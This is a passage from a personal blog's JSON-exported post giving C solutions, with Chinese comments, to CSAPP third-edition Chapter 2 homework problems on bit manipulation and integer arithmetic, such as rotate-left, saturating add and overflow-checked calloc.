class=\"comment\">//只考虑mod16==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">16</span>;\t<span class=\"comment\">//只考虑mod32==0的位置</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-66\"><a href=\"#2-66\" class=\"headerlink\" title=\"2.66\"></a>2.66</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">leftMostOne</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x-(x&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-67\"><a href=\"#2-67\" class=\"headerlink\" title=\"2.67\"></a>2.67</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">intSizeIs32</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> INT_MAX==<span class=\"number\">0x80000000</span><span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-68\"><a href=\"#2-68\" class=\"headerlink\" title=\"2.68\"></a>2.68</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lowerOneMark</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = -!(n-(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>));\t<span class=\"comment\">//方法1</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">1</span>&lt;&lt;n)<span class=\"number\">-1</span>&amp;~t | t;</span><br><span class=\"line\"><span class=\"comment\">//\treturn ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1;\t//方法2</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-69\"><a href=\"#2-69\" class=\"headerlink\" title=\"2.69\"></a>2.69</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">rotateLeft</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">unsigned</span>)&lt;&lt;<span class=\"number\">3</span>)-n<span class=\"number\">-1</span>)&gt;&gt;<span class=\"number\">1</span> | x&lt;&lt;n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-70\"><a href=\"#2-70\" class=\"headerlink\" title=\"2.70\"></a>2.70</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;n<span class=\"number\">-1</span>==<span class=\"number\">0</span> | x&gt;&gt;n<span class=\"number\">-1</span>==<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-71\"><a href=\"#2-71\" class=\"headerlink\" title=\"2.71\"></a>2.71</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">pack_t</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">xbyte</span><span class=\"params\">(<span class=\"keyword\">pack_t</span> word, <span class=\"keyword\">int</span> bytenum)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)word&lt;&lt;(<span class=\"number\">3</span>-bytenum&lt;&lt;<span class=\"number\">3</span>)&gt;&gt;<span class=\"number\">24</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-73\"><a href=\"#2-73\" class=\"headerlink\" title=\"2.73\"></a>2.73</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">saturatingAdd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//方法一</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)x+y&gt;&gt;t);</span><br><span class=\"line\">\tt = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -(p==<span class=\"number\">2</span>&amp;&amp;t!=<span class=\"number\">1</span>)&amp;INT_MIN | -(p==<span class=\"number\">1</span>&amp;&amp;t!=<span class=\"number\">1</span>)&amp;INT_MAX | -(p==<span class=\"number\">0</span>||t==<span class=\"number\">1</span>)&amp;x+y | -(p==<span class=\"number\">3</span>||t==<span class=\"number\">1</span>)&amp;x+y;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t<span class=\"comment\">//方法二</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class=\"number\">2</span>)|((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t&lt;&lt;<span class=\"number\">1</span>)|((<span class=\"keyword\">unsigned</span>)x+y&gt;&gt;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -(p==<span class=\"number\">6</span>)&amp;INT_MIN | -(p==<span class=\"number\">1</span>)&amp;INT_MAX | -(p!=<span class=\"number\">1</span>&amp;&amp;p!=<span class=\"number\">6</span>)&amp;x+y;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t<span class=\"comment\">//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> w=<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sum = x+y;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mask = <span class=\"number\">1</span>&lt;&lt;(w<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x_lmb = x&amp;mask;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> y_lmb = y&amp;mask;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sum_lmb = sum&amp;mask;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); <span class=\"comment\">//这一条不错</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-74\"><a href=\"#2-74\" class=\"headerlink\" title=\"2.74\"></a>2.74</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tsubOk</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = (<span class=\"keyword\">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class=\"number\">2</span> | (<span class=\"keyword\">unsigned</span>)-y&gt;&gt;t&lt;&lt;<span class=\"number\">1</span> | (<span class=\"keyword\">unsigned</span>)x-y&gt;&gt;t;</span><br><span class=\"line\">\tt = y==INT_MIN;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p!=<span class=\"number\">6</span> &amp;&amp; p!=<span class=\"number\">1</span> &amp;&amp; !t || t &amp;&amp; p==<span class=\"number\">6</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-75\"><a href=\"#2-75\" class=\"headerlink\" title=\"2.75\"></a>2.75</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">unsignedHightProd</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">unsigned</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = signed_high_prod(x, y);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-76\"><a href=\"#2-76\" class=\"headerlink\" title=\"2.76\"></a>2.76</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span>* <span class=\"title\">Calloc</span><span class=\"params\">(<span class=\"keyword\">size_t</span> nmemb, <span class=\"keyword\">size_t</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> t = nmemb*size;</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *p;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!size || t/size==nmemb)&#123;</span><br><span class=\"line\">\t\tp = <span class=\"built_in\">malloc</span>(t);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!p)<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(p, <span class=\"number\">0</span>, t);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-77\"><a href=\"#2-77\" class=\"headerlink\" title=\"2.77\"></a>2.77</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f2_77</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k1 = (x&lt;&lt;<span class=\"number\">4</span>)+x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k2 = -(x&lt;&lt;<span class=\"number\">3</span>)+x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k3 = (x&lt;&lt;<span class=\"number\">6</span>)-(x&lt;&lt;<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k4 = -(x&lt;&lt;<span class=\"number\">7</span>)+(x&lt;&lt;<span class=\"number\">4</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (k1==x*<span class=\"number\">17</span>)&lt;&lt;<span class=\"number\">3</span> | (k2==x*<span class=\"number\">-7</span>)&lt;&lt;<span class=\"number\">2</span> | (k3==x*<span class=\"number\">60</span>)&lt;&lt;<span class=\"number\">1</span> | k4==x*<span class=\"number\">-112</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-78\"><a href=\"#2-78\" class=\"headerlink\" title=\"2.78\"></a>2.78</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dividePower2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\tl = -(x&gt;&gt;l<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (l&lt;&lt;k)-l+x &gt;&gt; k;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-79\"><a href=\"#2-79\" class=\"headerlink\" title=\"2.79\"></a>2.79</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">mul3div4</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx = (x&lt;&lt;<span class=\"number\">2</span>) - x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = -(x&gt;&gt;l<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (t&lt;&lt;<span class=\"number\">2</span>)-t+x &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-80\"><a href=\"#2-80\" class=\"headerlink\" title=\"2.80\"></a>2.80</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">threefourths</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = x&amp;<span class=\"number\">0x3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t2 = -(x&gt;&gt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = (x&gt;&gt;<span class=\"number\">2</span>);</span><br><span class=\"line\">\tp = (p&lt;&lt;<span class=\"number\">1</span>)+p;</span><br><span class=\"line\">\tt = (t&lt;&lt;<span class=\"number\">1</span>)+t;</span><br><span class=\"line\">\tp += (t&gt;&gt;<span class=\"number\">2</span>) + (t2&amp;&amp;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-81\"><a href=\"#2-81\" class=\"headerlink\" title=\"2.81\"></a>2.81</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">hw281A</span><span class=\"params\">(<span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;k-!!k&lt;&lt;!!k);\t<span class=\"comment\">//k may equal to 0 or 32;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">hw281B</span><span class=\"params\">(<span class=\"keyword\">int</span> j, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = k+j;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;t-!!t&lt;&lt;!!t));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-82\"><a href=\"#2-82\" class=\"headerlink\" title=\"2.82\"></a>2.82</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * A: NO; x== 0x10000000, B==rand();</span></span><br><span class=\"line\"><span class=\"comment\"> * B: Yes; </span></span><br><span class=\"line\"><span class=\"comment\"> * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。</span></span><br><span class=\"line\"><span class=\"comment\"> * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加</span></span><br><span class=\"line\"><span class=\"comment\"> * D: Yes;</span></span><br><span class=\"line\"><span class=\"comment\"> * E: Yes;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"2-83\"><a href=\"#2-83\" class=\"headerlink\" title=\"2.83\"></a>2.83</h2><p>$\\sum_{i=1}^{\\infty}Y<em>2^{-k</em>i}$</p>\n<h2 id=\"2-84\"><a href=\"#2-84\" class=\"headerlink\" title=\"2.84\"></a>2.84</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> ((sx&lt;sy) &amp;&amp; ux!=<span class=\"number\">0</span> &amp;&amp; uy!=<span class=\"number\">0x80000000</span>) | (sx==sy) &amp; !!(ux-uy);</span><br></pre></td></tr></table></figure>\n","slug":"CSAPP3e-第二章作业","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Homework","slug":"CSAPP-Homework","permalink":"https://h-zex.github.io/tags/CSAPP-Homework/"}]}]}